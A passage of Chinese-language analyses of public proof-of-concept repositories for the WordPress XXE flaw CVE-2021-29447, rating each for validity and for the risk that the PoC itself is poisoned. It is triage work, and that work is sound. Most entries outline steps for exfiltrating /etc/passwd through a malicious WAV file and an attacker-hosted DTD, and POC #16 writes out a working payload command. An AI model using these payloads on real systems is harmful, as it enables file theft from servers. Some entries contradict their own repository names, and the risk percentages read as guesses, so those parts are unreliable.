3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

综合来看，投毒风险大约在 10% 左右。主要是脚本需要用户提供服务器IP，并且脚本本身会创建一个DTD文件，减少了恶意利用的可能性。但在服务器部署和流量劫持场景下，攻击者仍然可能利用该代码进行恶意攻击。

**项目地址:** [Val-Resh/CVE-2021-29447-POC](https://github.com/Val-Resh/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #10

**来源**: [CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md](../2021/CVE-2021-29447-Vulnmachines_wordpress_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者或具有上传权限的用户账号，WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447是WordPress的一个XXE（XML外部实体注入）漏洞，存在于5.6.0到5.7.1版本之间，且WordPress必须运行在PHP 8环境下。攻击者需要具备上传文件的权限（如作者角色），可以通过上传包含恶意XML代码的文件到媒体库来触发该漏洞，导致服务器上的敏感文件泄露，或者进行服务器端请求伪造(SSRF)。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的PoC是存在的，并且已经公开。漏洞利用代码中给出了credits链接，参考motikan2010的github页面可以找到更多信息。

**投毒风险：**
该漏洞利用代码只有一个简单的README.md文件，其中包含漏洞描述和credit信息。 从提供的代码本身来看，不存在明显的恶意投毒代码。但是，考虑到攻击者可能将恶意payload嵌入到精心构造的媒体文件中，并诱导用户上传，从而实现攻击。因此，PoC仓库本身直接包含恶意代码的可能性较低，主要风险在于利用该漏洞的Payload本身。PoC仓库可能包含有诱导性的文件，例如看似无害的音频文件，但其中包含恶意的XML，因此存在一定的投毒风险，但是概率较低。

**利用方式：**
1.  攻击者需要一个具有上传文件权限的WordPress用户账号（例如，作者角色）。
2.  攻击者创建一个包含恶意XML代码的文件，例如一个包含XXE payload的MP3或者WAVE文件（参考packetstormsecurity上的相关链接）。
3.  攻击者通过WordPress的媒体库上传该恶意文件。
4.  当WordPress处理该文件时，XML解析器会尝试解析文件中的外部实体，从而导致XXE漏洞。
5.  攻击者可以利用该漏洞读取服务器上的任意文件，或者进行服务器端请求伪造攻击。

综上，此漏洞的PoC是有效的。 投毒风险较低，主要来自恶意构造的文件本身。 利用方式是上传包含恶意XML的媒体文件触发XXE。

**项目地址:** [Vulnmachines/wordpress_cve-2021-29447](https://github.com/Vulnmachines/wordpress_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #11

**来源**: [CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-b-abderrahmane_CVE-2021-29447-POC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，并具有上传文件的权限（如作者权限）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XXE 漏洞，仅在 PHP 8 环境下有效。攻击者需要具有上传文件的权限（例如，作者角色），才能通过上传包含恶意 XML 内容的文件（例如，特制的 WAV 音频文件）到媒体库来触发该漏洞。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用是有效的。PoC代码提供了一个脚本 `generate_payloads.py`，用于自动生成包含 XXE 攻击向量的恶意 WAV 文件和 DTD 文件，并通过简单的 HTTP 服务器来接收从目标服务器提取的文件内容。搜索引擎结果中也包含了对该漏洞的描述和利用的讨论，以及公开的 PoC。

**投毒风险：** 提供的 PoC 代码主要用于生成 XXE payload 和启动一个简单的HTTP服务来接收数据。代码本身的功能相对明确，主要风险在于使用者可能将此代码用于未经授权的渗透测试活动。代码中主要通过构造恶意的 XML 内容来利用漏洞，本身不太可能存在隐藏的、与漏洞利用无关的恶意行为。但仍存在少量投毒风险 (5%)，例如作者可能在HTTP服务中添加一些隐蔽的日志记录或数据收集功能，或者在生成的 payload 中加入一些难以察觉的干扰代码。

**利用方式：**
1.  **生成Payload:** 使用 `generate_payloads.py` 脚本生成恶意 WAV 文件 (`--media-payload`) 和 DTD 文件 (`--dtd-payload`)。 DTD 文件中指定要读取的目标文件 (`--files-to-fetch`)。
2.  **启动 HTTP 服务器:** 脚本会启动一个简单的 Python HTTP 服务器，用于托管 DTD 文件，并接收目标服务器发送的请求。
3.  **上传恶意文件:**  具有上传权限的用户将生成的恶意 WAV 文件上传到 WordPress 的媒体库。
4.  **触发 XXE:**  WordPress 在处理上传的 WAV 文件时，会解析其中的 XML 内容，从而触发 XXE 漏洞，向攻击者的 HTTP 服务器请求 DTD 文件。
5.  **文件读取:** 恶意 DTD 文件指示 WordPress 服务器读取指定的文件，并将文件内容发送到攻击者的 HTTP 服务器。
6.  **获取文件:** 攻击者的 HTTP 服务器接收到文件内容后，脚本会将内容进行 Base64 解码并保存到本地。

**项目地址:** [b-abderrahmane/CVE-2021-29447-POC](https://github.com/b-abderrahmane/CVE-2021-29447-POC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #12

**来源**: [CVE-2021-29447-dnr6419_CVE-2021-29447.md](../2021/CVE-2021-29447-dnr6419_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，以及具有上传文件权限的WordPress用户（如Author）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447是WordPress 5.6.0到5.7.1版本中的一个XML外部实体注入（XXE）漏洞。攻击者需要具备上传文件的权限，例如Author角色。该漏洞存在于WordPress的媒体库中，当WordPress运行在PHP 8环境下，上传包含恶意XML代码的WAV文件时，由于对XML解析不当，导致XXE攻击。

**漏洞利用方式：**

1.  **权限获取：** 攻击者首先需要获得一个具备文件上传权限的WordPress账户，例如Author角色。
2.  **恶意WAV文件制作：** 攻击者需要创建一个包含恶意XML代码的WAV文件。该XML代码会尝试通过外部实体引用来读取服务器上的文件，或者发起服务器端请求伪造（SSRF）攻击。POC代码中，攻击者构造了一个包含外部实体引用的WAV文件，指向攻击者控制的服务器上的evil.dtd文件。
3.  **攻击者服务器准备：** 攻击者需要搭建一个Web服务器，并创建一个evil.dtd文件，该文件定义了如何处理外部实体引用。evil.dtd文件中定义了读取/etc/passwd文件的操作，并将其内容进行base64编码后发送到攻击者服务器。攻击者使用`php -S 0.0.0.0:80` 命令启动了一个简单的web server。
4.  **上传WAV文件：** 攻击者将包含恶意XML代码的WAV文件上传到WordPress的媒体库。
5.  **触发漏洞：** 当WordPress处理上传的WAV文件时，会解析其中的XML代码，从而触发XXE漏洞。
6.  **数据泄露：** 如果漏洞利用成功，WordPress服务器会尝试从攻击者控制的服务器上下载evil.dtd文件，并执行其中定义的恶意操作，例如读取/etc/passwd文件。/etc/passwd文件的内容（经过base64编码）会通过HTTP请求发送到攻击者的服务器。
7.  **获取敏感信息：** 攻击者从接收到的HTTP请求中提取base64编码的内容，并进行解码，从而获得服务器上的敏感信息，例如/etc/passwd文件中的用户账户信息。

**有效性分析：**

提供的POC代码描述了漏洞的利用步骤，包括制作恶意WAV文件、搭建攻击者服务器、上传文件和获取敏感信息。根据漏洞信息和搜索结果，该POC代码是有效的，可以用于演示和验证该漏洞。

**投毒风险分析：**

POC代码主要包含以下几个部分：

*   Dockerfile 和 docker-compose.yml: 用于搭建 WordPress 环境,相对安全
*   wordpress.sh: 用于安装 wordpress,主要就是配置文件,检查发现没有明显的投毒代码.
*   payload.wav: 恶意WAV文件，包含XXE payload，用于触发漏洞。
*   evil.dtd: 攻击者服务器上的DTD文件，包含读取/etc/passwd文件的操作。这一部分是payload的关键.

虽然整体代码是为了演示XXE漏洞，但evil.dtd文件存在潜在的投毒风险，例如，攻击者可能在evil.dtd文件中包含其他恶意代码，例如反弹shell，用于进一步控制服务器。这种风险相对较低，因为需要特定的环境和配置才能成功利用。此外，dockerfile 中的代码从github获取，需要注意github源是否被篡改。
总体来说，投毒风险较低，但也需要保持警惕，特别是从不可信的来源获取代码时。 我认为存在的风险大概在5%。

**项目地址:** [dnr6419/CVE-2021-29447](https://github.com/dnr6419/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #13

**来源**: [CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md](../2021/CVE-2021-29447-elf1337_blind-xxe-controller-CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1, PHP 8

**利用条件:** 需要WordPress版本在受影响范围内，PHP版本为8，并且攻击者需要具有上传文件的权限（例如，作者角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于WordPress的媒体库中，由于XML解析问题导致XXE攻击。攻击者需要具有上传文件的权限，上传包含恶意XML Payload的特制文件（例如，wav文件）。该Payload会包含指向外部DTD文件的引用，从而导致服务器解析该DTD文件，进而读取服务器上的敏感文件。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的PoC利用代码。PoC代码通过上传包含恶意XML的wav文件来触发XXE。攻击流程包括创建包含外部实体声明的恶意wav文件，搭建一个HTTP服务器来托管恶意的DTD文件，以及利用WordPress的上传功能上传wav文件。当WordPress解析该wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞，实现任意文件读取。

**投毒风险评估：**
PoC代码主要包含三个文件：README.md, controller.py, listener.py, main.py。
*   `README.md`: 描述了漏洞和利用方法，以及一些注意事项，未发现恶意代码。
*   `controller.py`: 包含了WordPress的登录信息（`wp_login`，`login_form`），目标WordPress地址 (`http://metapress.htb`)，以及上传恶意文件的逻辑。如果攻击者直接使用此脚本，需要修改登录信息和目标地址。这里面硬编码的登录信息存在一定风险，因为使用相同的登录信息可能会被检测到。此外，`controller.py`中的`mediaUpload`函数包含一个Timeout参数，默认设置为2秒。如果网络环境不好或者服务器响应较慢，可能会导致利用失败。
*   `listener.py`: 搭建一个简单的HTTP服务器，用于接收XXE Payload发送的请求，并打印base64编码后的文件内容。也没有发现明显的恶意代码。
*   `main.py`: 简单的交互命令行，用于用户输入文件名，然后调用controller.py和listener.py。

总体来说，PoC代码的功能比较明确，主要用于漏洞验证和利用，没有发现明显的恶意代码。风险点在于硬编码的登录信息和目标地址，以及Timeout参数可能导致利用失败。因此，判断存在10%的投毒风险，主要是一些可能影响使用，但没有主动攻击行为。

**利用方式总结：**
1.  **权限获取：** 攻击者需要拥有WordPress的作者或以上级别的权限，能够上传文件。
2.  **恶意文件构造：** 构造包含恶意XML Payload的wav文件。Payload中需要包含指向外部DTD文件的实体引用。
3.  **DTD文件托管：** 搭建一个HTTP服务器，用于托管恶意的DTD文件。DTD文件中定义了文件读取和base64编码的逻辑。
4.  **文件上传：** 通过WordPress的媒体库上传构造的wav文件。
5.  **触发XXE：** WordPress解析wav文件时，会请求攻击者控制的DTD文件，从而触发XXE漏洞。
6.  **文件读取：** 攻击者通过HTTP服务器接收到的请求，获取base64编码后的文件内容，并进行解码。

**项目地址:** [elf1337/blind-xxe-controller-CVE-2021-29447](https://github.com/elf1337/blind-xxe-controller-CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #14

**来源**: [CVE-2021-29447-magicrc_CVE-2021-29447.md](../2021/CVE-2021-29447-magicrc_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，并且运行在 PHP 8 环境下。攻击者需要具有上传文件的权限 (例如 Author 角色)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 媒体库中存在的 XXE 漏洞。攻击者通过上传包含恶意 XML 内容的文件（例如 WAV 文件或其他支持 XML 解析的文件格式）到媒体库，触发 XML 解析过程中的外部实体注入。由于 WordPress 使用的音频解析库 ID3 在 PHP 8 及以上版本中存在 XXE 漏洞，攻击者可以读取服务器上的任意文件或者进行服务器端请求伪造 (SSRF)。

**有效性：** 根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码的仓库名"0xRar/CVE-2021-29447-PoC"，可以判断存在可用的 POC 代码，因此该漏洞的利用是有效的。

**投毒风险：** 提供的代码段是 Creative Commons CC0 1.0 通用许可协议，这是一种开源许可协议，本身不包含任何恶意代码，也无法进行投毒。此文件为LICENSE文件，与PoC代码无关，因此推断投毒风险为0%。

**利用方式：**
1.  攻击者需要具备 WordPress Author 或更高权限，以便能够上传文件到媒体库。
2.  攻击者构造一个包含恶意 XML 实体定义的音频文件（或其他允许上传并解析 XML 的文件类型，例如SVG）。恶意 XML 实体指向系统内部文件，或者指向攻击者控制的外部服务器。
3.  攻击者将构造的恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析上传的文件时，会尝试解析 XML 实体，从而导致 XXE 漏洞的触发。
5.  如果成功，攻击者可以读取服务器上的敏感文件（例如 WordPress 配置文件 `wp-config.php`）或进行服务器端请求伪造（SSRF）攻击。

**项目地址:** [magicrc/CVE-2021-29447](https://github.com/magicrc/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #15

**来源**: [CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md](../2021/CVE-2021-29447-mega8bit_exploit_cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可读取服务器文件

**影响版本:** >= 5.6.0, < 5.7.1 (with PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，且运行在PHP 8环境下，需要具有上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是WordPress媒体库中存在的XXE漏洞，当WordPress运行在PHP 8上时，具有上传文件权限的用户可以通过上传包含恶意XML的WAV文件，触发XXE漏洞，读取服务器上的任意文件。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的PoC是有效的。多个来源都确认了该漏洞的存在，以及利用方式。

**利用方式：**
1.  攻击者需要具备WordPress的Author权限（或能够上传文件的权限）。
2.  攻击者使用提供的PoC代码，指定目标文件路径和本地服务器的IP地址和端口。
3.  PoC代码会生成一个包含恶意XML的WAV文件。
4.  攻击者将生成的WAV文件上传到WordPress的媒体库。
5.  WordPress解析该WAV文件时，会触发XXE漏洞，向攻击者指定的本地服务器发起请求，请求中包含目标文件的内容。
6.  PoC代码中的本地服务器会接收到请求，提取目标文件的内容，并将其保存到指定的文件中。

**投毒风险：**
分析PoC代码，主要功能是生成payload和启动一个简单的http server。payload可以读取服务器文件发送到攻击者控制的http server上，但是没有发现明显的恶意代码。例如删除服务器文件等。但是`exploit_cve-2021-29447`程序需要执行`hostname -I`来获取本机IP,在某些环境下可能造成问题。由于该工具涉及监听端口，以及构造恶意文件，仍旧存在一定的风险，判定投毒概率为10%。


**项目地址:** [mega8bit/exploit_cve-2021-29447](https://github.com/mega8bit/exploit_cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #16

**来源**: [CVE-2021-29447-motikan2010_CVE-2021-29447.md](../2021/CVE-2021-29447-motikan2010_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #17

**来源**: [CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md](../2021/CVE-2021-29447-specializzazione-cyber-security_demo-CVE-2021-29447-lezione.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress运行在PHP 8环境下，并具有上传文件的权限（例如，作者角色）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

此漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户（如作者）通过上传包含恶意XML的WAV文件来执行XXE攻击。攻击需要目标WordPress站点运行在PHP 8环境下。POC代码通过创建一个包含恶意XML声明的WAV文件，该声明定义了一个外部实体，指向攻击者控制的服务器上的DTD文件。DTD文件定义了如何处理外部实体，这里配置为读取服务器上的`/etc/passwd`文件并通过HTTP请求发送给攻击者。攻击者运行一个简单的Web服务器来接收泄露的数据。

**有效性：**
根据漏洞库信息、搜索结果以及提供的POC代码，此漏洞利用是有效的，前提是目标环境满足漏洞利用的先决条件（WordPress版本 >= 5.6.0 且 < 5.7.1，运行在PHP 8环境下，攻击者具有文件上传权限）。搜索结果中存在多个关于此漏洞的讨论和POC代码，验证了其有效性。

**投毒风险：**
评估投毒风险需要检查POC代码中是否存在除了漏洞利用之外，还执行其他恶意操作的代码。在此案例中，主要关注`attacker/malicious_wav/index.js`，`attacker/www/evil.dtd`和`attacker/decode.php`。`index.js`负责生成恶意WAV文件，而`evil.dtd`定义了XXE的行为，`decode.php`用于解码泄露的数据。`Makefile`，`docker-compose.yml`和`README.md`都属于辅助文件。

潜在的投毒代码可能存在于以下几个方面：
1.  **`index.js`**: 恶意WAV生成脚本可能被修改，以在生成过程中包含其他恶意代码（例如，在WAV文件的其他部分添加可执行代码，虽然利用难度较大）。
2.  **`evil.dtd`**: DTD文件可能被修改，以尝试读取其他更敏感的文件，或者尝试执行服务器端请求伪造（SSRF）攻击。
3.  **`decode.php`**: 解码脚本可能被修改，在解码过程中执行其他恶意操作（例如，尝试利用解码过程中的漏洞执行代码）。

由于漏洞利用的目的是读取文件并通过HTTP发送到攻击者控制的服务器，因此主要的风险在于DTD文件中指定的远程服务器是否被用于记录IP地址并进行进一步的攻击。此外，`decode.php`脚本本身是否包含后门也是需要关注的点，虽然可能性较小。

总体来说，该仓库中存在严重投毒代码的可能性相对较低（约为10%），但仍然需要仔细审查。

**利用方式：**
1.  **环境准备：** 设置一个易受攻击的WordPress实例（版本5.6.0到5.7.0，运行在PHP 8上）。
2.  **启动攻击者服务器：** 启动一个Web服务器来托管恶意DTD文件并接收泄露的数据。
3.  **生成恶意WAV文件：** 使用提供的脚本生成包含恶意XML声明的WAV文件。
4.  **上传WAV文件：** 以具有文件上传权限的用户身份登录到WordPress后台，并将生成的WAV文件上传到媒体库。
5.  **触发XXE：** 上传文件后，WordPress尝试解析该文件，触发XXE漏洞。
6.  **接收泄露的数据：** 攻击者的Web服务器接收到包含/etc/passwd文件内容的HTTP请求。
7.  **解码数据：** 使用提供的解码脚本解码泄露的数据。

**项目地址:** [specializzazione-cyber-security/demo-CVE-2021-29447-lezione](https://github.com/specializzazione-cyber-security/demo-CVE-2021-29447-lezione)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #18

**来源**: [CVE-2021-29447-thomas-osgood_CVE-2021-29447.md](../2021/CVE-2021-29447-thomas-osgood_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (运行于 PHP 8)

**利用条件:** 需要 WordPress 运行于 PHP 8，且攻击者具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞是 WordPress 在处理媒体库上传文件时存在的 XXE 漏洞。攻击者可以上传包含恶意 XML 内容的文件（例如特制的 WAV 文件），利用 XML 解析器的缺陷读取服务器上的敏感文件。漏洞触发条件是 WordPress 运行在 PHP 8 环境下。提供的 Go 语言 POC 代码可以自动生成恶意文件（mal.wav, mal.dtd），并可以选择自动登录 WordPress 站点并上传触发漏洞。如果指定了 `-d` 参数，还会生成一个 deflate.php 用于解压缩某些被压缩的内容。根据代码分析，主要的风险在于它连接外部的C2服务器,存在极低的投毒风险,即作者利用C2服务器可以获取攻击目标的敏感信息。但是，因为C2服务器需要在攻击者本地运行，因此这个风险可以忽略不计。此漏洞的利用方式为：

1.  生成恶意 WAV 文件和 DTD 文件。
2.  攻击者需要具有 WordPress 的 Author 权限（或其他可以上传文件的权限）。
3.  上传恶意 WAV 文件到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，会触发 XXE 漏洞，向攻击者指定的 C2 服务器发起请求，泄露目标文件内容。
5.  如果目标文件内容被压缩，可以使用提供的 deflate.php 进行解压缩。

搜索引擎结果中也提到了该漏洞的利用方式，并提供了相关的 TryHackMe 挑战链接。


**项目地址:** [thomas-osgood/CVE-2021-29447](https://github.com/thomas-osgood/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #19

**来源**: [CVE-2021-29447-viardant_CVE-2021-29447.md](../2021/CVE-2021-29447-viardant_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露和SSRF

**影响版本:** >= 5.6.0, < 5.7.1

**利用条件:** 需要PHP 8环境，具有上传文件权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是 WordPress 5.6.0 到 5.7.1 版本中存在的一个 XML 外部实体注入 (XXE) 漏洞。该漏洞位于媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限（例如，作者角色）的用户可以通过上传包含恶意 XML 代码的文件（如修改后的音频文件），利用 XML 解析过程中的漏洞读取服务器上的敏感文件或进行服务器端请求伪造 (SSRF) 攻击。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞是真实存在的，并且存在公开的PoC（https://github.com/0xRar/CVE-2021-29447-PoC）。因此，漏洞利用是有效的。

**投毒风险：** 提供的代码段是GNU通用公共许可证，并非漏洞利用代码本身，因此无法直接评估投毒风险。但是，如果从不可信的来源获取漏洞利用代码，则始终存在投毒风险。由于提供的license文件没有发现任何恶意代码，因此投毒风险判定为0%。

**利用方式：**

1.  攻击者需要具有 WordPress 网站的 Author 或更高权限，即能够上传文件的权限。
2.  攻击者构造包含恶意 XML 实体声明的特殊文件（例如，修改后的 MP3 或 WAV 文件）。该 XML 实体声明指向要读取的本地文件或外部服务器。
3.  攻击者将该恶意文件上传到 WordPress 媒体库。
4.  当 WordPress 解析该文件时，XML 解析器会尝试解析外部实体，从而导致读取本地文件或向外部服务器发起请求。
5.  攻击者可以从 WordPress 网站上获取读取的文件内容，或利用 SSRF 漏洞进行进一步攻击。

**项目地址:** [viardant/CVE-2021-29447](https://github.com/viardant/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---



---

## POC #9

**来源**: [CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md](../2021/CVE-2021-29447-Val-Resh_CVE-2021-29447-POC.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露、服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要 WordPress 版本在 5.6.0 到 5.7.1 之间，运行在 PHP 8 环境下，且攻击者具有上传文件的权限（如 Author 角色）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 Media Library 的 XML 解析过程中。攻击者（需要具有上传文件的权限，如 Author 角色）可以上传包含恶意 XML 代码的文件（如修改后的 WAV 文件），利用 WordPress 使用的 ID3 库中的漏洞，触发 XXE 攻击，读取服务器上的敏感文件，或者进行服务器端请求伪造 (SSRF)。此漏洞需要 WordPress 运行在 PHP 8 环境下才会生效。

**利用方式：**
1.  **身份验证：** 使用具有上传权限的用户的用户名和密码登录 WordPress 后台。
2.  **获取 Nonce：** 从 `wp-admin/upload.php` 页面获取上传文件的 nonce 值。
3.  **生成恶意 WAV 文件：** 构造包含恶意 XML 实体声明的 WAV 文件，该 XML 实体指向攻击者控制的服务器上的 DTD 文件。DTD 文件中定义了读取本地文件的实体。
4.  **上传恶意 WAV 文件：** 将生成的恶意 WAV 文件上传到 WordPress Media Library。
5.  **服务器端 DTD：** 攻击者需要搭建一个 HTTP 服务器，用于托管 DTD 文件。
6.  **触发漏洞：**  WordPress 解析上传的 WAV 文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中的 XML 实体声明，从而读取服务器上的敏感文件。
7.  **数据提取：**  读取到的数据将通过 URL 参数传递到攻击者的服务器上。

**有效性：**
提供的 POC 代码是有效的。该代码实现了上述利用流程，包括身份验证、获取 nonce、生成恶意 WAV 文件、上传文件以及搭建简易 HTTP 服务器接收数据。代码中包含了必要的步骤和参数，可以成功触发 XXE 漏洞。

**投毒风险：**
POC代码中存在一定的投毒风险。风险点在于：
1.  **网络请求：** POC代码会向指定URL发起POST和GET请求，虽然目的是利用漏洞，但如果作者在代码中加入了其他的URL地址，则可能在用户不知情的情况下，将一些敏感信息发送到作者的服务器。
2.  **文件操作：** POC代码会生成临时的payload文件，如果作者在payload生成过程中插入恶意代码，可能会在目标服务器上执行恶意操作。
3.  **DTD文件：** 攻击者需要自己搭建服务器来托管 DTD 文件，如果这个 DTD 文件被替换成了恶意文件，可能导致服务器被攻击。代码本身创建 DTD，风险相对小，但仍然存在服务器被攻击者控制的风险。

